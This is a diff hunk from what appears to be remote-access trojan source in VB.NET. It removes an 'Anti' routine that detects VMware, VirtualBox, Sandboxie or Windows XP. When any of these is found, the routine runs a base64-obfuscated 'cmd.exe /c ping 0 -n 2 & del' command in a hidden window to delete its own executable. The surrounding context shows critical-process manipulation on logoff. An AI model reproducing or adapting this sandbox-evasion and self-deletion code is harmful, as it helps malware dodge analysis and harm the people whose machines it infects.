@@ -48,25 +48,6 @@
             Return a.ToArray
         End Function
 
-        Sub Anti()
-            Try
-                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
-                    GoTo del
-                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
-                    GoTo del
-                ElseIf Diagnostics.Process.GetProcessesByName("SbieSvc").Length >= 1 Then
-                    GoTo del
-                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
-                    GoTo del
-                End If
-                Exit Sub
-del:
-                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
-                End
-            Catch ex As Exception
-            End Try
-        End Sub
-
         Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
             If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                 C_CriticalProcesses.CriticalProcesses_Disable()
